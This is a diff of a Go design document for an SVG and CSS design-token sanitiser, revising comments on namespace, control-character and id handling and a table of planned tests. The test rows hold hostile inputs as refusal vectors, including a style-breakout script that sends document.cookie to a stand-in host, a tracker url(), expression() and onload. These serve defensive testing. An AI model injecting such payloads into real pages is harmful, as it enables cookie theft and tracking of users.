@@ -296,14 +296,18 @@ var SVGAttrs = []string{"xmlns", "viewBox", "width", "height", "preserveAspectRa
 // parses it with DOMParser("image/svg+xml") (task 24), where a missing xmlns puts
 // every element in no namespace and draws nothing (review I8):
 //   - the root is written `<svg xmlns="http://www.w3.org/2000/svg" …>` whatever
-//     the input had; no other element carries xmlns;
+//     the input had; no other element carries xmlns. An input xmlns (root or
+//     child) naming any other namespace is also reported (DropAttribute), since
+//     the rewrite changes meaning; a missing one, or a child's that equals the SVG
+//     namespace, is not (see Checker.SVG's line, re-review RR-M3);
 //   - element and attribute names are written in SVG's case (linearGradient,
 //     clipPath, viewBox, gradientUnits, preserveAspectRatio): x/net/html lowercases
 //     them and restores SVG case in foreign content (x/net@v0.26.0 html/foreign.go,
 //     svgTagNameAdjustments :126-153, svgAttributeAdjustments :175-217), and the
 //     writer uses those names, since XML is case-sensitive;
 //   - attribute values escape & < " (as &amp; &lt; &quot;), text escapes & < >,
-//     and characters XML 1.0 forbids (C0 controls but tab, LF and CR) are removed;
+//     and characters XML 1.0 forbids (C0 controls but tab, LF and CR) are removed
+//     and reported (DropValue, one entry per SVG);
 //     empty elements are written <path …/>.
 // Ids are made unique per node (review I8): SVG nodes of one artboard share one
 // iframe document, so two icons that each define id="paint0_linear" (Figma's
@@ -325,8 +329,10 @@ var SVGAttrs = []string{"xmlns", "viewBox", "width", "height", "preserveAspectRa
 // drop every Figma reference; the defs-last vectors in TestSVG_idsPerNode and
 // TestParse_twoSVGs kill that mutant. nodeID "" is
 // for an SVG asset (upload_asset, an <img src="data:image/svg+xml…">, task 16),
-// which renders in its own image document: ids are kept unprefixed; xmlns and
-// well-formedness are the same.
+// which renders in its own image document: ids are written as their local part
+// alone — the same "n-<12 hex>-" strip runs first, so SanitiseSVG("", SanitiseSVG(a, m))
+// == SanitiseSVG("", m), which is what task 08's round trip relies on (re-review
+// RR-M2); xmlns and well-formedness are the same.
 func SanitiseSVG(nodeID, markup string) (canonical string, report Report, err error)
 ```
 
@@ -363,6 +369,11 @@ func (Checker) TokenValue(t doc.TokenType, value string) error
 // here so neither package imports the other.
 var ErrUnsafeToken = errors.New("dialect: a token value fails the dialect")
 
+// ErrUnsafeNode is ExportHTML's error for a node whose stored SVG or declaration
+// fails the dialect on re-check (task 08, re-review RR-M1): a replayed document is
+// not re-checked on load, so the export checks it before it reaches a browser.
+var ErrUnsafeNode = errors.New("dialect: a node fails the dialect")
+
 // TokenRules is TokenValue's step 4, one rule per doc.TokenType.
 var TokenRules = map[doc.TokenType]Rule{
 	doc.TokenColor: RuleColor, doc.TokenRadius: RuleLength, doc.TokenSpacing: RuleLength,
@@ -395,6 +406,14 @@ const (
 // Differences that drop nothing (attribute order, the id prefix of another node
 // id) are canonicalised, not refused, so a duplicate under a new id is re-prefixed
 // in this one Go function rather than in each client (review I8).
+// The line, for every rewrite SanitiseSVG makes (re-review RR-M3): a rewrite that
+// only changes how the same SVG is SPELLED is canonicalised silently — attribute
+// order, name case (lineargradient → linearGradient), a missing root xmlns, an
+// xmlns on a child that equals the SVG namespace, escaping, self-closing, the id
+// prefix. A rewrite that REMOVES or CHANGES meaning is a report entry, so Checker.SVG
+// refuses it: a root or child xmlns naming any other namespace (DropAttribute,
+// "an SVG is always in the SVG namespace"), and an XML-forbidden control character
+// (DropValue, "control characters are not allowed in SVG").
 func (Checker) SVG(nodeID, markup string) (canonical string, err error)
 
 // CheckDeclaration is Style with the report entry the caller surfaces.
@@ -434,13 +453,13 @@ func CheckDeclaration(property, value string) (kept bool, drop *Drop)
 | `TestParse_tokens` | `color: var(--brand)` with no `brand` token is kept with a `unknown-token` warning | unknown tokens refused (agents create tokens after using them) |
 | `TestCSS_tokenizer` (table) | strings with `;` inside, nested functions, `url( "asset:sha256-…" )` with spaces and quotes, comments inside values | a naive `strings.Split(";")` |
 | `TestSVG_sanitise` | `SanitiseSVG("n-000000000001", `<svg onload><linearGradient id="g"/><use href="#x"/><path d="M0 0" fill="url(#g)" /></svg>`)` keeps the gradient, the path and the fragment url (as `url(#n-000000000001-g)`), drops `onload` and `use`; attributes sorted | `href` kept |
-| `TestSVG_namespace` | `<svg viewBox="0 0 24 24"><path d="M0 0"/></svg>` (no `xmlns`, valid inline HTML) → canonical starts `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">`; `xmlns="http://evil.example/"` on the root is replaced by the SVG namespace; `xmlns` on a child is not written; `encoding/xml`'s `Decoder` reads the output to EOF with no error and the root's `Name.Space` is `SVGNamespace` | an SVG node that draws nothing (review I8) |
+| `TestSVG_namespace` | `<svg viewBox="0 0 24 24"><path d="M0 0"/></svg>` (no `xmlns`, valid inline HTML) → canonical starts `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">`; `xmlns="http://evil.example/"` on the root is replaced by the SVG namespace and reported (`attribute`); `xmlns` on a child is not written (reported only when it names another namespace); the no-`xmlns` input reports nothing; `encoding/xml`'s `Decoder` reads the output to EOF with no error and the root's `Name.Space` is `SVGNamespace` | an SVG node that draws nothing (review I8) |
 | `TestSVG_case` | `<svg><lineargradient gradientunits="userSpaceOnUse"/><clippath/></svg>` → `linearGradient`, `gradientUnits`, `clipPath`, and `viewbox` → `viewBox` | a lowercased name an XML parser does not know |
-| `TestSVG_wellFormed` | `<text>` content `a & b < c`, an attribute value holding `"` and `&`, and a U+0001 → `a &amp; b &lt; c`, `&quot;` and `&amp;` in the value, no U+0001; `encoding/xml` decodes it | ill-formed XML: DOMParser yields a `parsererror` document |
-| `TestSVG_idsPerNode` | the same markup with `<linearGradient id="paint0_linear">`, `<clipPath id="c">`, `<mask id="m">`, and one path with `fill="url(#paint0_linear)"`, `stroke="url(#paint0_linear)"`, `clip-path="url(#c)"`, `mask="url(#m)"` (every url-bearing attribute, not `fill` alone) under `n-000000000001` and `n-000000000002` → ids `n-000000000001-paint0_linear` and `n-000000000002-paint0_linear`, each `url()` naming its own, both outputs equal byte for byte to the two literals task 24's `svgIdsDistinct` also holds; `SanitiseSVG(b, SanitiseSVG(a, m)) == SanitiseSVG(b, m)` and `SanitiseSVG(a, SanitiseSVG(a, m)) == SanitiseSVG(a, m)`; plus a **defs-last** row (Figma's export order, re-review RR-I8-1): `<svg><path d="M0 0" fill="url(#paint0_linear_1_2)"/><defs><linearGradient id="paint0_linear_1_2"/></defs></svg>` under `n-000000000004` keeps the `fill` as `url(#n-000000000004-paint0_linear_1_2)` and reports nothing | two icons in one artboard sharing one gradient; a clone stacking prefixes; a one-pass `url(#…)` check that drops a reference to a later id |
+| `TestSVG_wellFormed` | `<text>` content `a & b < c`, an attribute value holding `"` and `&`, and a U+0001 → `a &amp; b &lt; c`, `&quot;` and `&amp;` in the value, no U+0001 and one `value` report entry for it (the escaping reports nothing); `encoding/xml` decodes it | ill-formed XML: DOMParser yields a `parsererror` document |
+| `TestSVG_idsPerNode` | the same markup with `<linearGradient id="paint0_linear">`, `<clipPath id="c">`, `<mask id="m">`, and one path with `fill="url(#paint0_linear)"`, `stroke="url(#paint0_linear)"`, `clip-path="url(#c)"`, `mask="url(#m)"` (every url-bearing attribute, not `fill` alone) under `n-000000000001` and `n-000000000002` → ids `n-000000000001-paint0_linear` and `n-000000000002-paint0_linear`, each `url()` naming its own, both outputs equal byte for byte to the two literals task 24's `svgIdsDistinct` also holds; `SanitiseSVG(b, SanitiseSVG(a, m)) == SanitiseSVG(b, m)`, `SanitiseSVG(a, SanitiseSVG(a, m)) == SanitiseSVG(a, m)` and `SanitiseSVG("", SanitiseSVG(a, m)) == SanitiseSVG("", m)`, whose ids read `paint0_linear`, `c`, `m` with no `n-` prefix (re-review RR-M2, the export round trip's comparison); plus a **defs-last** row (Figma's export order, re-review RR-I8-1): `<svg><path d="M0 0" fill="url(#paint0_linear_1_2)"/><defs><linearGradient id="paint0_linear_1_2"/></defs></svg>` under `n-000000000004` keeps the `fill` as `url(#n-000000000004-paint0_linear_1_2)` and reports nothing | two icons in one artboard sharing one gradient; a clone stacking prefixes; a one-pass `url(#…)` check that drops a reference to a later id |
 | `TestSVG_danglingRef` | in an SVG that defines no `nope` and no `g`: `fill="url(#nope)"`, and `fill="url(#n-000000000009-g)"` naming another node's id, and `id="1bad"` → the two refs and the id each dropped as `attribute`, with the reasons `svg.go` names | one node's SVG reaching another node's element |
 | `TestParse_twoSVGs` | an artboard's HTML with two Figma-style icons, both `id="paint0_linear"`, each in Figma's **defs-last** order (the `<path fill="url(#paint0_linear)">` first, the `<defs><linearGradient id="paint0_linear">` last) → two svg nodes whose canonical markup shares no id (every `id="…"` value across both is distinct), each `fill` names its own node's gradient, and the parse report is empty | the review I8 scenario end to end in Go; a one-pass `url(#…)` check (re-review RR-I8-1) |
-| `TestChecker_SVG` | `Checker.SVG(id, SanitiseSVG(id, m))` returns the same string; `Checker.SVG(b, SanitiseSVG(a, m))` returns `SanitiseSVG(b, m)` (re-prefixed, not refused); markup with `<script>` or `onload` errs (a drop is a refusal, never a repair) | the authority silently repairing a bypass, or refusing every duplicate |
+| `TestChecker_SVG` | `Checker.SVG(id, SanitiseSVG(id, m))` returns the same string; `Checker.SVG(b, SanitiseSVG(a, m))` returns `SanitiseSVG(b, m)` (re-prefixed, not refused); markup with `<script>` or `onload` errs (a drop is a refusal, never a repair); one row per RR-M3 rewrite: canonicalised, not refused — `<lineargradient>` (case), no root `xmlns`, a child `xmlns="http://www.w3.org/2000/svg"`; refused — root `xmlns="http://evil.example/"`, a child `xmlns="http://www.w3.org/1999/xhtml"`, a U+0001 in an attribute value (re-review RR-M3) | the authority silently repairing a bypass, or refusing every duplicate; a removal passed off as canonicalisation, or a spelling change refused |
 | `TestChecker_implementsDoc` | `var _ doc.Checker = dialect.Checker{}`; `Style("margin","0")` errs | the authority checking with a different list than the parser |
 | `TestTokenValue` (table, one row per token type, plus every line of **`testdata/token-accept.jsonl`, shared with task 23**) | every accept line ✓ (`font-weight: bold` and `650`, `letter-spacing: normal`, `spacing: var(--space-2)`, `line-height: 1.4`, the Inter family list, …); `color: 12px` ✗, `font-weight: 1001` ✗, `font-weight: 12px` ✗, `letter-spacing: bold` ✗; and, through `CheckDeclaration`, `opacity: bold` and `flex-grow: normal` still refused (the token rules added no keyword to a declaration rule) | a type check that accepts anything; a keyword special-cased in Go's `TokenValue` but not carried by the rule name TS reads (re-review RR-I2-1); a keyword added to the shared `RuleNumber`/`RuleLength` |
 | `TestTokenValue_refusals` (table; `testdata/token-vectors.jsonl`, **shared with task 23's `allowedTokenValue.test.ts`**) | refused, each under the type its prefix names (the review's two are also refused under every other of the ten types, so no type's rule can let them through): the review's two values — `font-family: red}</style><script>fetch('https://x.example/?'+document.cookie)</script><style>` and `font-family: url(https://tracker.example/p.png)` — and `color: URL(https://x)` and `color: Url(https://x)` (CSS function names are ASCII case-insensitive), `color: red; background: url(https://x)`, `color: red !important`, `color: url(asset:sha256-<64 hex>)` (step 3), `radius: 8px /*`, `font-family: "Inter`, `color: \72 ed`, `spacing: expression(1)`, a value holding U+000A; `font-family: attr(x)` and `font-family: var(--a)` refused by step 4 (a family list holds no function) | a token value that reaches `<style>`, `tokens.css` or `setProperty` without the checks a declaration gets (review I2) |
